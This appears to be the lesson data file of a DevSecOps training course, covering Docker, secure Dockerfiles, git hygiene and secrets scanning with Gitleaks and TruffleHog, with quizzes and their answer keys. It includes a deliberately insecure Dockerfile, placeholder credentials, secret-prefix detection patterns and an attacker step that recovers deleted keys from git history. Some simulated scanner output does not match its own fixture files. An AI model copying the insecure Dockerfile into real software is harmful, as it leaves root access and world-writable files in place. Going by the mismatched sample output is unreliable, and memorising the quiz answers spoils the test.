      commands: [
        { cmd: 'docker --version', desc: 'Verify Docker is installed. You should see a version number.' },
        { cmd: 'docker run hello-world', desc: 'Run the classic hello-world container. Reads the step-by-step explanation.' },
        { cmd: 'docker run --rm -it alpine:latest sh', desc: 'Start an interactive Alpine shell. Try: whoami, cat /etc/os-release, then type exit.' },
        { cmd: 'docker images', desc: 'List all local images. Note the sizes.' },
        { cmd: 'docker run -d -p 8080:80 --name mynginx nginx:latest', desc: 'Run Nginx in background on port 8080.' },
        { cmd: 'curl http://localhost:8080', desc: 'Visit the running Nginx server. You should see the default welcome page HTML.' },
        { cmd: 'docker logs mynginx', desc: 'View container logs.' },
        { cmd: 'docker exec -it mynginx sh', desc: 'Shell into the running container. Try: ls /usr/share/nginx/html, then exit.' },
        { cmd: 'docker stop mynginx && docker rm mynginx', desc: 'Stop and remove the container.' },
        { cmd: 'docker ps -a', desc: 'Confirm no containers remain.' },
      ],
    },
    verify: [
      'What version of Docker are you running? (paste the version string)',
      'Run `docker images` — how many images do you have locally?',
    ],
    quiz: [
      { q: "What flag runs a Docker container in detached (background) mode?", opts: ["-d", "-b", "--background", "-r"], answer: 0, explanation: "The -d flag runs the container in detached mode, returning control to your terminal." },
      { q: "What is the difference between a Docker image and a container?", opts: ["They're the same thing", "An image is a template; a container is a running instance of an image", "A container is bigger than an image", "Images run on servers; containers run locally"], answer: 1, explanation: "An image is a read-only template with instructions. A container is a runnable instance created from an image." },
      { q: "Why should you avoid using the 'latest' tag in production?", opts: ["It's slower to pull", "The underlying image can change without warning, making builds non-reproducible", "Docker doesn't support it", "It uses more disk space"], answer: 1, explanation: "The 'latest' tag is mutable — it can point to different image versions over time, making your builds non-reproducible and potentially introducing unexpected changes." },
      { q: "What command shows resource usage (CPU/memory) of running containers?", opts: ["docker info", "docker top", "docker stats", "docker inspect"], answer: 2, explanation: "docker stats shows a live stream of CPU, memory, network, and disk I/O for running containers." },
      { q: "Why prefer python:3.12-slim over python:3.12 as a base image?", opts: ["It runs Python faster", "Smaller image = fewer packages = smaller attack surface", "It includes more security tools", "Slim images have built-in vulnerability scanning"], answer: 1, explanation: "Slim images contain only essential packages, reducing the attack surface significantly (fewer installed packages = fewer potential vulnerabilities)." },
    ],
  },
  '1.5': {
    id: '1.5', pathId: 1, title: 'Writing Secure Dockerfiles', baseXP: 80, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'Dockerfile Instructions', blocks: [
          { type: 'keyterms', terms: [
            { term: 'FROM', definition: 'Sets the base image. Always the first instruction. Pin a specific version.' },
            { term: 'RUN', definition: 'Executes a command during build (install packages, compile code). Each RUN creates a layer.' },
            { term: 'COPY', definition: 'Copies files from your machine into the image. Use .dockerignore to exclude secrets.' },
            { term: 'WORKDIR', definition: 'Sets the working directory inside the container. Avoids using cd in RUN commands.' },
            { term: 'USER', definition: 'Sets which user the container runs as. Always switch to a non-root user for security.' },
            { term: 'EXPOSE', definition: 'Documents which port the container listens on. Does not actually open the port.' },
            { term: 'CMD', definition: 'The default command when the container starts. Use JSON array format: ["python", "app.py"].' },
            { term: 'HEALTHCHECK', definition: 'Tells Docker how to check if the container is healthy. Essential for orchestration.' },
          ]},
        ]},
        { heading: 'Multi-Stage Builds', blocks: [
          { type: 'text', content: 'Multi-stage builds let you use a large image for building and a tiny image for running. This dramatically reduces attack surface.' },
          { type: 'scan-output', tool: 'Dockerfile', title: 'Multi-Stage Build Example', findings: [
            { type: 'header', text: '# Stage 1: Build (large image with compilers)\\nFROM golang:1.22 AS builder\\nWORKDIR /app\\nCOPY . .\\nRUN go build -o myapp' },
            { type: 'header', text: '\\n# Stage 2: Run (tiny image, just the binary)\\nFROM alpine:3.19\\nCOPY --from=builder /app/myapp /myapp\\nUSER 1000\\nCMD ["/myapp"]' },
          ]},
          { type: 'severity-bars', title: 'Image Size Comparison', items: [
            { rank: '🔴', label: 'golang:1.22 (build image)', count: 850, color: '#EF4444' },
            { rank: '🟢', label: 'alpine:3.19 (runtime image)', count: 8, color: '#22C55E' },
          ]},
          { type: 'callout', variant: 'tip', content: 'The final image is only 8MB with the compiled binary — 99% smaller than the build image. Fewer packages = fewer CVEs = smaller attack surface.' },
        ]},
        { heading: 'Security Best Practices', blocks: [
          { type: 'steps', steps: [
            { label: 'Pin specific base image versions', detail: 'Use python:3.12-slim, never python:latest. The :latest tag is mutable and can change without warning.' },
            { label: 'Use slim or distroless images', detail: 'Fewer installed packages = fewer vulnerabilities. Distroless images have no shell at all.' },
            { label: 'Create and switch to non-root user', detail: 'RUN useradd -r appuser && USER appuser. If the container is compromised, the attacker gets limited permissions.' },
            { label: 'Never COPY secrets into images', detail: 'Use .dockerignore to exclude .env, credentials, and private keys. Secrets should be injected at runtime via Vault or env vars.' },
            { label: 'Add HEALTHCHECK', detail: 'HEALTHCHECK CMD curl -f http://localhost:5000/health || exit 1. Orchestrators use this to detect and restart unhealthy containers.' },
            { label: 'Minimize layers and packages', detail: 'Combine RUN commands with && to reduce layers. Use --no-install-recommends to skip unnecessary packages.' },
          ]},
        ]},
        { heading: 'Bad vs Good Dockerfile', blocks: [
          { type: 'comparison', items: [
            { title: 'Insecure Dockerfile', color: '#EF4444', points: [
              'FROM ubuntu:latest',
              'RUN apt-get install -y everything',
              'COPY . . (includes .env and secrets)',
              'RUN chmod 777 /app',
              'No USER directive (runs as root)',
              'No HEALTHCHECK',
            ]},
            { title: 'Secure Dockerfile', color: '#22C55E', points: [
              'FROM python:3.12-slim',
              'RUN apt-get install --no-install-recommends',
              'COPY only needed files, .dockerignore configured',
              'RUN useradd -r appuser && USER appuser',
              'Read-only filesystem where possible',
              'HEALTHCHECK CMD curl -f /health',
            ]},
          ]},
          { type: 'scan-output', tool: 'hadolint', title: 'What Hadolint Catches', findings: [
            { type: 'finding', severity: 'HIGH', text: 'DL3007: Using latest tag — pin a specific version', file: 'Dockerfile:1' },
            { type: 'finding', severity: 'HIGH', text: 'DL3002: Last USER should not be root', file: 'Dockerfile:8' },
            { type: 'finding', severity: 'MEDIUM', text: 'DL3008: Pin versions in apt-get install', file: 'Dockerfile:3' },
            { type: 'finding', severity: 'MEDIUM', text: 'DL3025: Use JSON notation for CMD', file: 'Dockerfile:10' },
            { type: 'summary', text: 'Hadolint automatically catches these in CI — add it to your pipeline!' },
          ]},
        ]},
      ],
    },
    simulation: {
      title: 'Secure the Dockerfile',
      scenario: "You've inherited a Dockerfile with security issues. Review it, identify the problems, and know how to fix them.",
      files: {
        'project/': {
          'Dockerfile.bad': 'FROM ubuntu:latest\nRUN apt-get update && apt-get install -y python3 python3-pip\nCOPY . .\nRUN chmod 777 /app\nRUN pip3 install flask\nEXPOSE 5000\nCMD ["python3", "app.py"]',
          'Dockerfile.good': 'FROM python:3.12-slim\nWORKDIR /app\nRUN groupadd -r appuser && useradd -r -g appuser appuser\nCOPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\nCOPY --chown=appuser:appuser . .\nUSER appuser\nEXPOSE 5000\nHEALTHCHECK CMD curl -f http://localhost:5000/health || exit 1\nCMD ["python3", "app.py"]',
          'app.py': 'from flask import Flask\napp = Flask(__name__)\n\n@app.route("/")\ndef hello():\n    return "Hello!"\n\n@app.route("/health")\ndef health():\n    return "OK"\n\nif __name__ == "__main__":\n    app.run(host="0.0.0.0", port=5000)',
          '.env': 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nSTRIPE_SECRET_KEY=sk_test_FAKE51ABCxyz123',
        },
      },
      steps: [
        { objective: 'Build the insecure Dockerfile', command: 'docker build -t myapp:insecure -f Dockerfile.bad .', output: 'Step 1/7: FROM ubuntu:latest\n ---> 174c8c134b2a\nStep 2/7: RUN apt-get update && apt-get install -y python3 python3-pip\n ---> Running in a1b2c3d4\n ---> 5e6f7a8b9c0d\nStep 3/7: COPY . .\n ---> 1a2b3c4d5e6f\nStep 4/7: RUN chmod 777 /app\nStep 5/7: RUN pip3 install flask\nStep 6/7: EXPOSE 5000\nStep 7/7: CMD ["python3", "app.py"]\nSuccessfully built 7a8b9c0d1e2f\nSuccessfully tagged myapp:insecure', followUp: 'What base image is being used?', answer: 'ubuntu:latest', hint: 'Look at the FROM instruction in Dockerfile.bad' },
        { objective: 'Check what user the insecure container runs as', command: 'docker run --rm myapp:insecure whoami', output: 'root', followUp: 'Is running as root a security risk? (yes/no)', answer: 'yes', hint: 'Type: docker run --rm myapp:insecure whoami' },
        { objective: 'Lint the insecure Dockerfile with Hadolint', command: 'hadolint Dockerfile.bad', output: 'Dockerfile.bad:1 DL3007 warning: Using latest is prone to errors if the image will ever update. Pin the version explicitly\nDockerfile.bad:2 DL3008 warning: Pin versions in apt-get install\nDockerfile.bad:2 DL3009 info: Delete the apt-get lists after installing\nDockerfile.bad:3 DL3045 warning: COPY to a relative destination without WORKDIR set\nDockerfile.bad:4 DL3002 error: Last USER should not be root\nDockerfile.bad:5 SC2086 info: Double quote to prevent globbing', followUp: 'What rule ID flags the use of \'latest\' tag?', answer: 'DL3007', hint: 'Look for the rule about "latest" in the output' },
        { objective: 'Build the secure Dockerfile', command: 'docker build -t myapp:secure -f Dockerfile.good .', output: 'Step 1/10: FROM python:3.12-slim\nStep 2/10: WORKDIR /app\nStep 3/10: RUN groupadd -r appuser && useradd -r -g appuser appuser\nStep 4/10: COPY requirements.txt .\nStep 5/10: RUN pip install --no-cache-dir -r requirements.txt\nStep 6/10: COPY --chown=appuser:appuser . .\nStep 7/10: USER appuser\nStep 8/10: EXPOSE 5000\nStep 9/10: HEALTHCHECK CMD curl -f http://localhost:5000/health || exit 1\nStep 10/10: CMD ["python3", "app.py"]\nSuccessfully tagged myapp:secure', followUp: 'What user does the secure image run as?', answer: 'appuser', hint: 'Look at the USER instruction in Dockerfile.good' },
        { objective: 'Compare image sizes', command: 'docker images | grep myapp', output: 'myapp    insecure   7a8b9c0d1e2f   1 minute ago    412MB\nmyapp    secure     2c3d4e5f6a7b   30 seconds ago  158MB', followUp: 'Which image is smaller and by roughly how much?', answer: 'secure', hint: 'Compare the SIZE column' },
      ],
    },
    execute: {
      intro: 'Create both Dockerfiles and compare them in your real environment.',
      commands: [
        { cmd: 'mkdir -p dockerfile-lab && cd dockerfile-lab', desc: 'Create a working directory.' },
        { cmd: 'docker build -t myapp:insecure -f Dockerfile.bad .', desc: 'Build the insecure version.' },
        { cmd: 'docker run --rm myapp:insecure whoami', desc: 'Verify it runs as root.' },
        { cmd: 'hadolint Dockerfile.bad', desc: 'Lint the insecure Dockerfile. Install hadolint first if needed: brew install hadolint' },
        { cmd: 'docker build -t myapp:secure -f Dockerfile.good .', desc: 'Build the secure version.' },
        { cmd: 'docker run --rm myapp:secure whoami', desc: 'Verify it runs as non-root.' },
        { cmd: 'docker images | grep myapp', desc: 'Compare sizes.' },
      ],
    },
    verify: [
      'What is the size of your secure image in MB?',
      'What DL rules does Hadolint flag on your Dockerfile?',
    ],
    quiz: [
      { q: "What does the USER instruction do in a Dockerfile?", opts: ["Creates a new Docker account", "Sets the user for subsequent instructions and the container runtime", "Adds a password to the image", "Logs into Docker Hub"], answer: 1, explanation: "The USER instruction sets the user (and optionally group) for any RUN, CMD, and ENTRYPOINT instructions that follow in the Dockerfile." },
      { q: "Why use multi-stage builds?", opts: ["To run multiple apps in one container", "To reduce final image size by separating build tools from runtime", "To build for multiple platforms", "To enable parallel container execution"], answer: 1, explanation: "Multi-stage builds let you use large images with build tools to compile your app, then copy only the final artifact into a small runtime image." },
      { q: "What is wrong with 'RUN chmod 777'?", opts: ["It's slow", "It gives read/write/execute permissions to ALL users — a security risk", "chmod doesn't work in Docker", "It only works on Linux"], answer: 1, explanation: "chmod 777 gives full read, write, and execute permissions to every user on the system. This is a major security issue, especially in containerized environments." },
      { q: "What should a .dockerignore file contain?", opts: ["Docker commands", "Files and directories to exclude from the build context (.env, .git, node_modules)", "Container names", "Port mappings"], answer: 1, explanation: ".dockerignore prevents sensitive files (.env, .git) and large unnecessary directories (node_modules) from being copied into the image." },
      { q: "What does HEALTHCHECK do in a Dockerfile?", opts: ["Checks if Docker is installed", "Tells Docker how to test if the container is still working correctly", "Scans for vulnerabilities", "Monitors CPU usage"], answer: 1, explanation: "HEALTHCHECK tells Docker how to test the container to check that it's still working. Docker can then automatically restart unhealthy containers." },
    ],
  },
  '1.6': {
    id: '1.6', pathId: 1, title: 'Git Security Basics', baseXP: 80, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'Git Remembers Everything', blocks: [
          { type: 'callout', variant: 'warning', content: 'Git is a permanent record. Even "deleted" files exist in git history forever. A secret committed once is accessible to anyone who clones the repo — even if you delete it in the next commit.' },
          { type: 'attack-flow', steps: [
            { type: 'info', label: 'Developer commits AWS key', detail: 'Accidentally pushes config.py with AKIA... key to GitHub.' },
            { type: 'info', label: 'Realizes mistake, deletes key', detail: 'Removes the key in the next commit. Thinks the problem is solved.' },
            { type: 'attack', label: 'Attacker runs: git log --all -p', detail: 'The key is still visible in the old commit. Bots do this automatically on public repos within seconds.' },
            { type: 'defense', label: 'Prevention: pre-commit hooks', detail: 'Gitleaks pre-commit hook would have blocked the commit BEFORE the key ever entered git history.' },
          ]},
        ]},
        { heading: '.gitignore — Your First Defense', blocks: [
          { type: 'text', content: 'Always create a .gitignore BEFORE your first commit. Once a file is tracked by git, .gitignore alone won\'t help — you must also remove it from tracking.' },
          { type: 'scan-output', tool: '.gitignore', title: 'Essential .gitignore for Security', findings: [
            { type: 'header', text: '# Secrets and credentials\\n.env\\n.env.local\\n*.key\\n*.pem\\ncredentials.json\\nconfig/secrets.*' },
            { type: 'header', text: '\\n# Dependencies (may contain vulns)\\nnode_modules/\\n__pycache__/\\nvendor/' },
            { type: 'header', text: '\\n# Build artifacts\\ndist/\\n*.pyc\\n.terraform/' },
          ]},
        ]},
        { heading: 'Git Hooks for Prevention', blocks: [
          { type: 'text', content: 'Git hooks are scripts that run automatically at specific points in the git workflow. Pre-commit hooks are the most important for security:' },
          { type: 'pipeline', stages: [
            { label: 'git add', icon: '📝', desc: 'Stage files', security: false },
            { label: 'git commit', icon: '💾', desc: 'Trigger hooks', security: false },
            { label: 'Pre-commit', icon: '🔍', desc: 'Gitleaks scan', security: true, tool: 'Gitleaks' },
            { label: 'Commit OK', icon: '✅', desc: 'No secrets found', security: true },
            { label: 'git push', icon: '🚀', desc: 'Push to remote', security: false },
          ]},
          { type: 'callout', variant: 'key-concept', content: 'If Gitleaks finds a secret in staged files, the commit is BLOCKED. The secret never enters git history. This is prevention, not detection — infinitely better than finding secrets after they\'re committed.' },
        ]},
        { heading: 'Branch Protection', blocks: [
          { type: 'comparison', items: [
            { title: 'Unprotected Branch', color: '#EF4444', points: [
              'Anyone can push directly to main',
              'No code review required',
              'CI checks can be skipped',
              'Force push can rewrite history',
            ]},
            { title: 'Protected Branch', color: '#22C55E', points: [
              'Requires pull request for all changes',
              'Minimum 1-2 reviewer approvals',
              'CI/security checks must pass',
              'No force push, no deletion',
            ]},
          ]},
        ]},
        { heading: 'Why History Scanning Matters', blocks: [
          { type: 'text', content: 'Tools like TruffleHog don\'t just scan current files — they scan the ENTIRE git history, commit by commit. A secret committed 1000 commits ago and later deleted is still findable.' },
          { type: 'scan-output', tool: 'trufflehog', title: 'History Scan Finding a Deleted Secret', findings: [
            { type: 'finding', severity: 'CRITICAL', text: 'AWS Access Key found in commit a1b2c3d (deleted 6 months ago)', file: 'old-config.py' },
            { type: 'summary', text: 'This key was "deleted" but lives forever in git history. TruffleHog found it. So would an attacker.' },
          ]},
          { type: 'callout', variant: 'tip', content: 'Prevention (pre-commit hooks) is always better than detection (history scanning). But run both — pre-commit catches new leaks, history scanning catches old ones.' },
        ]},
      ],
    },
    simulation: {
      title: 'Set Up Git Security',
      scenario: "Set up a secure git repository with proper .gitignore and pre-commit hooks to prevent secrets from being committed.",
      files: {
        'my-project/': {
          '.gitignore': '# Secrets\n.env\n*.key\n*.pem\ncredentials.json\n\n# Dependencies\nnode_modules/\n__pycache__/\n\n# Build\ndist/\nbuild/',
          'pre-commit-hook.sh': '#!/bin/sh\n# Pre-commit hook: scan for secrets\necho "Running Gitleaks pre-commit scan..."\ngitleaks protect --staged -v\nif [ $? -ne 0 ]; then\n  echo "\\n❌ Secrets detected! Commit blocked."\n  echo "Remove the secrets and try again."\n  exit 1\nfi\necho "✅ No secrets found. Commit allowed."',
          'app.py': 'import os\n\n# Good: read from environment\napi_key = os.environ.get("API_KEY")\ndb_url = os.environ.get("DATABASE_URL")\n\nprint("App starting...")',
          '.env': 'API_KEY=sk_test_FAKE51ABCxyz123\nDATABASE_URL=postgresql://admin:password123@db.example.com/prod',
        },
      },
      steps: [
        { objective: 'Initialize a new git repository', command: 'git init', output: 'Initialized empty Git repository in /home/user/my-project/.git/', followUp: 'What hidden directory does git create?', answer: '.git', hint: 'Type: git init' },
        { objective: 'Create a .gitignore file', command: 'cat .gitignore', output: '# Secrets\n.env\n*.key\n*.pem\ncredentials.json\n\n# Dependencies\nnode_modules/\n__pycache__/\n\n# Build\ndist/\nbuild/', followUp: 'Is .env listed in .gitignore? (yes/no)', answer: 'yes', hint: 'View the .gitignore file' },
        { objective: 'Check git status to verify .env is ignored', command: 'git status', output: 'On branch main\n\nNo commits yet\n\nUntracked files:\n  (use "git add <file>..." to include in what will be committed)\n\t.gitignore\n\tapp.py\n\tpre-commit-hook.sh\n\nnothing added to commit but untracked files present', followUp: 'Does .env appear in the untracked files list? (yes/no)', answer: 'no', hint: 'Look at the Untracked files section — .env should NOT appear because it\'s in .gitignore' },
        { objective: 'Set up the pre-commit hook', command: 'cp pre-commit-hook.sh .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit', output: '(hook installed)', followUp: 'What directory do git hooks live in?', answer: '.git/hooks', hint: 'Copy the hook script to .git/hooks/pre-commit' },
        { objective: 'Test the pre-commit hook by trying to commit a secret', command: 'gitleaks protect --staged -v', output: 'Running Gitleaks pre-commit scan...\n0 leaks found in staged changes ✅', followUp: 'What exit code means "secrets found" for the hook? (0 or 1)', answer: '1', hint: 'Exit code 1 means failure/secrets found, 0 means clean' },
      ],
    },
    execute: {
      intro: 'Set up git security on a real repository.',
      commands: [
        { cmd: 'mkdir git-security-lab && cd git-security-lab && git init', desc: 'Create and initialize a new repo.' },
        { cmd: 'echo ".env\\n*.key\\n*.pem\\ncredentials.json" > .gitignore', desc: 'Create .gitignore with common secret patterns.' },
        { cmd: 'echo "API_KEY=test123" > .env', desc: 'Create a .env file (should be ignored by git).' },
        { cmd: 'git status', desc: 'Verify .env does NOT appear in untracked files.' },
        { cmd: 'gitleaks protect --staged -v', desc: 'Run Gitleaks as a pre-commit check (install: brew install gitleaks).' },
      ],
    },
    verify: [
      'What is the exit code when your pre-commit hook blocks a commit?',
      'After running git status, does .env appear?',
    ],
    quiz: [
      { q: "When should you create a .gitignore file?", opts: ["After the first release", "Before your first commit", "Only when a security team asks", "After secrets are found"], answer: 1, explanation: "Create .gitignore BEFORE your first commit to ensure sensitive files are never tracked. Once a file is tracked, .gitignore alone won't remove it." },
      { q: "A secret was committed 50 commits ago and then deleted. Is it still accessible?", opts: ["No, it was deleted", "Yes, it exists in git history forever", "Only if you have admin access", "Only on the remote, not locally"], answer: 1, explanation: "Git history preserves everything. Even deleted files exist in the commit history and can be found by anyone who clones the repository." },
      { q: "What is a pre-commit hook?", opts: ["A GitHub webhook", "A script that runs automatically before each commit is created", "A post-deployment check", "A branch protection rule"], answer: 1, explanation: "Pre-commit hooks are local git hooks that execute before a commit is finalized. They can scan for secrets and block the commit if issues are found." },
      { q: "Which tool scans git history for leaked secrets?", opts: ["git log", "TruffleHog", "git diff", "npm audit"], answer: 1, explanation: "TruffleHog can scan the entire git history, including deleted files and old commits, to find credentials that were ever committed." },
      { q: "What's the difference between .gitignore and git hooks for secret prevention?", opts: ["They do the same thing", ".gitignore prevents tracking files; hooks scan content of staged changes for secret patterns", ".gitignore is better", "Hooks are only for CI/CD"], answer: 1, explanation: ".gitignore prevents certain files from being tracked. Git hooks actively scan the content of changes for secret patterns, catching secrets in any file." },
    ],
  },
  '2.1': {
    id: '2.1', pathId: 2, title: 'Secrets Detection', baseXP: 120, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'Types of Secrets', blocks: [
          { type: 'text', content: 'Secrets are any credentials, tokens, or keys that grant access to systems or data. Scanners detect them by matching known patterns (regex) and measuring randomness (entropy).' },
          { type: 'keyterms', terms: [
            { term: 'API Key', definition: 'A token that authenticates requests to a service (e.g., AKIAIOSFODNN7EXAMPLE for AWS).' },
            { term: 'Database Password', definition: 'Credentials for database access, often in connection strings like postgresql://admin:pass@host.' },
            { term: 'JWT Signing Key', definition: 'Secret used to sign JSON Web Tokens. Leaked key lets attackers forge any token.' },
            { term: 'SSH Private Key', definition: 'Private key for SSH authentication. Begins with -----BEGIN RSA PRIVATE KEY-----.' },
            { term: 'OAuth Token', definition: 'Access or refresh token for OAuth flows. Often prefixed (ghp_, gho_, xoxb-).' },
            { term: 'Cloud Credentials', definition: 'AWS access keys, GCP service account JSON, Azure client secrets for cloud API access.' },
          ] },
          { type: 'callout', variant: 'tip', title: 'Pattern Recognition', content: 'Each secret type has a distinct format. AWS keys start with AKIA, GitHub PATs start with ghp_, Stripe keys start with sk_live_ or sk_test_. Scanners use these patterns to find secrets automatically.' },
        ] },
        { heading: 'How Secrets Leak', blocks: [
          { type: 'text', content: 'Secrets end up in the wrong places through several common vectors. The most dangerous is committing them to git, because git history is permanent — even after deletion, the secret remains in old commits.' },
          { type: 'attack-flow', steps: [
            { type: 'attack', label: 'Developer Hardcodes Secret', detail: 'API key written directly in source code or config file' },
            { type: 'attack', label: 'Committed to Git', detail: 'Secret enters git history — even if deleted later, it persists in old commits' },
            { type: 'attack', label: 'Pushed to Remote', detail: 'Secret now on GitHub/GitLab, potentially in a public or compromised repo' },
            { type: 'attack', label: 'Attacker Scrapes Repos', detail: 'Automated bots scan public repos for secrets within seconds of push' },
            { type: 'attack', label: 'Data Breach', detail: 'Attacker uses credentials to access cloud resources, databases, or APIs' },
          ] },
          { type: 'callout', variant: 'warning', title: 'Git History is Forever', content: 'Deleting a file with a secret does NOT remove it from git history. The secret persists in previous commits. You must rotate the secret AND use tools like git-filter-repo or BFG to clean history.' },
        ] },
        { heading: 'Prevention vs Detection', blocks: [
          { type: 'text', content: 'A strong secrets management strategy uses both prevention (stop secrets from entering code) and detection (find secrets that slipped through). Prevention is always cheaper and safer.' },
          { type: 'comparison', items: [
            { title: 'Prevention', color: '#22C55E', points: [
              'Pre-commit hooks block secrets before they enter git',
              '.gitignore excludes sensitive files (.env, credentials)',
              'Environment variables keep secrets out of code',
              'Vault/secrets manager for runtime injection',
              'Cost: $0 — secret never leaked',
            ] },
            { title: 'Detection', color: '#F59E0B', points: [
              'CI/CD scanning catches secrets after commit',
              'Repository scanning finds existing leaks',
              'Git history scanning finds old secrets',
              'Monitoring for credential usage anomalies',
              'Cost: secret rotation + incident response',
            ] },
          ] },
          { type: 'callout', variant: 'key-concept', title: 'Defense in Depth', content: 'Use both prevention AND detection. Pre-commit hooks are your first line of defense. CI/CD scanning is your safety net. Git history scanning catches what both missed.' },
        ] },
        { heading: 'Tool Comparison', blocks: [
          { type: 'text', content: 'Gitleaks and TruffleHog are the two most popular open-source secrets detection tools. They use different approaches and complement each other well.' },
          { type: 'comparison', items: [
            { title: 'Gitleaks', color: '#3B82F6', points: [
              'Regex-based pattern matching',
              'Very fast — ideal for CI/CD pipelines',
              'Built-in pre-commit hook support',
              'SARIF output for GitHub integration',
              'Custom rules via .gitleaks.toml',
            ] },
            { title: 'TruffleHog', color: '#A78BFA', points: [
              'Regex + entropy-based detection',
              'Verified credentials (checks if secrets are still active)',
              'Deep git history scanning',
              '700+ credential detectors',
              'Can scan GitHub orgs, S3 buckets, filesystems',
            ] },
          ] },
          { type: 'scan-output', tool: 'gitleaks', title: 'Gitleaks Scan Output', findings: [
            { type: 'header', text: '$ gitleaks detect -v' },
            { type: 'finding', text: 'aws-access-key-id', severity: 'CRITICAL', file: 'config.py:8' },
            { type: 'finding', text: 'aws-secret-access-key', severity: 'CRITICAL', file: 'config.py:9' },
            { type: 'finding', text: 'github-pat (ghp_...)', severity: 'HIGH', file: 'config.py:12' },
            { type: 'finding', text: 'stripe-secret-key (sk_test_...)', severity: 'HIGH', file: '.env:2' },
            { type: 'finding', text: 'sendgrid-api-key (SG...)', severity: 'HIGH', file: '.env:3' },
            { type: 'finding', text: 'slack-bot-token (xoxb-...)', severity: 'HIGH', file: 'app.js:5' },
            { type: 'summary', text: '6 leaks found in 4 files' },
          ] },
        ] },
        { heading: 'Real-World Breach', blocks: [
          { type: 'callout', variant: 'warning', title: 'Uber Breach (2016)', content: 'Two developers committed AWS credentials to a private GitHub repo. Attackers found the keys, accessed an S3 bucket containing 57 million rider and driver records. Uber paid the attackers $100K to delete the data and hide the breach. They were later fined millions by regulators.' },
          { type: 'attack-flow', steps: [
            { type: 'attack', label: 'AWS Keys in GitHub', detail: 'Developers committed AWS access keys to a private repository' },
            { type: 'attack', label: 'Attacker Found Keys', detail: 'Attackers gained access to the private repo and extracted credentials' },
            { type: 'attack', label: 'S3 Bucket Accessed', detail: '57 million rider/driver records in an S3 bucket were exposed' },
            { type: 'defense', label: 'What Should Have Happened', detail: 'Pre-commit hooks, secrets scanning, IAM roles instead of static keys' },
          ] },
          { type: 'cost-chart', items: [
            { stage: 'Pre-commit hook', multiplier: '1x', color: '#22C55E' },
            { stage: 'CI/CD detection', multiplier: '10x', color: '#F59E0B' },
            { stage: 'Post-breach rotation', multiplier: '100x', color: '#EF4444' },
            { stage: 'Regulatory fines', multiplier: '1000x', color: '#EF4444' },
          ] },
        ] },
      ],
    },
    simulation: {
      title: 'Hunt the Secrets',
      scenario: "A developer says they 'cleaned up' the repo. Your job: prove there are still secrets hiding in the code and git history.",
      files: {
        'webapp/': {
          'config.py': 'import os\n\n# Database configuration\nDB_HOST = "db.prod.internal"\nDB_USER = "admin"\nDB_PASSWORD = "SuperSecret123!"\n\n# AWS Credentials\nAWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"\nAWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"\n\n# GitHub PAT\nGITHUB_TOKEN = "ghp_FAKE_EXAMPLE_TOKEN_00000000000"',
          '.env': '# API Keys\nSTRIPE_SECRET_KEY=sk_test_FAKE_ABCDEFxyz123456789\nSENDGRID_API_KEY=SG_FAKE_abc123def456ghi789jkl012\nDATABASE_URL=postgresql://admin:password123@db.example.com:5432/production',
          'deployment.yaml': 'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webapp\nspec:\n  template:\n    spec:\n      containers:\n      - name: webapp\n        image: webapp:latest\n        env:\n        - name: SECRET_TOKEN\n          value: "eyJGQUtFIjoiZXhhbXBsZSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZmFrZSI6dHJ1ZX0.FAKE_SIGNATURE_FOR_DEMO"\n        - name: API_SECRET\n          value: "c2VjcmV0LXRva2VuLWhlcmU="',
          'app.js': 'const express = require("express");\nconst app = express();\n\n// TODO: move to env vars\nconst SLACK_WEBHOOK = "https://hooks.example.com/services/TXXXX/BXXXX/xxxxxxxxxxxx";\nconst API_TOKEN = "fake-slack-token-xxxx-0000000000000-xxxxxxxxxx";\n\napp.get("/", (req, res) => {\n  res.send("Hello!");\n});\n\napp.listen(3000);',
        },
      },
      steps: [
        { objective: 'Browse the files and identify secrets manually', command: 'ls', output: 'config.py  .env  deployment.yaml  app.js', followUp: 'How many files contain hardcoded secrets?', answer: '4', hint: 'Look at each file — config.py, .env, deployment.yaml, and app.js all contain secrets' },
        { objective: 'Install and run Gitleaks', command: 'gitleaks detect -v', output: 'Finding:     AKIAIOSFODNN7EXAMPLE\nSecret:      AKIA...MPLE\nRuleID:      aws-access-key-id\nEntropy:     3.52\nFile:        config.py\nLine:        8\n\nFinding:     wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nSecret:      wJal...KEY\nRuleID:      aws-secret-access-key\nFile:        config.py\nLine:        9\n\nFinding:     ghp_FAKE_EXAMPLE_TOKEN_00000000000\nSecret:      ghp_...1234\nRuleID:      github-pat\nFile:        config.py\nLine:        12\n\nFinding:     sk_test_FAKE_ABCDEFxyz123456789\nSecret:      sk_l...6789\nRuleID:      stripe-secret-key\nFile:        .env\nLine:        2\n\nFinding:     SG_FAKE_abc123def456ghi789jkl012\nSecret:      SG.a...345\nRuleID:      sendgrid-api-key\nFile:        .env\nLine:        3\n\nFinding:     xoxb-123456789012-1234567890123-AbCdEf...\nSecret:      xoxb...vWx\nRuleID:      slack-bot-token\nFile:        app.js\nLine:        5\n\n6 leaks found in 4 files', followUp: 'How many secrets did Gitleaks find?', answer: '6', hint: 'Count the Finding entries in the output' },
        { objective: 'Generate a JSON report', command: 'gitleaks detect --report-format json --report-path report.json', output: '6 leaks found.\n\n📝 Report saved to report.json', followUp: 'What format is the report in?', answer: 'json', hint: 'Look at the --report-format flag' },
        { objective: 'Generate a SARIF report', command: 'gitleaks detect --report-format sarif --report-path report.sarif', output: '6 leaks found.\n\n📝 SARIF report saved to report.sarif', followUp: 'What is SARIF used for?', answer: 'standard format for security findings', hint: 'SARIF = Static Analysis Results Interchange Format — a standard way to share security tool results' },
